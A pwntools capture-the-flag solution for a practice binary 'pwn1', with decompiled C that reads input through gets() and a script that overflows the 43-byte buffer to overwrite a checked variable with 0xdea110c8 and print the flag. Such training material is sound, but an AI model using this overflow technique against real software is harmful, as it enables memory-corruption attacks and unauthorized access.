from pwn import *
'''
*** Reversing code***
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
'''

#load process
p = process('./pwn1')
#  compare EBP-0x10 and print the flag 
# address 0xdea110c8
address = p32(0xdea110c8)

#gdb-peda$ x/s $ebp-0x10 ----> 0xffffd018: "b4Ab"
#pattern_offset.rb -q b4Ab = 43
offset  = "A" * 43 
payload = offset + address

# send first answer
p.sendline("Sir Lancelot of Camelot")
# send second answer
p.sendline("To seek the Holy Grail.")
# send payload
p.sendline(payload)
p.interactive()
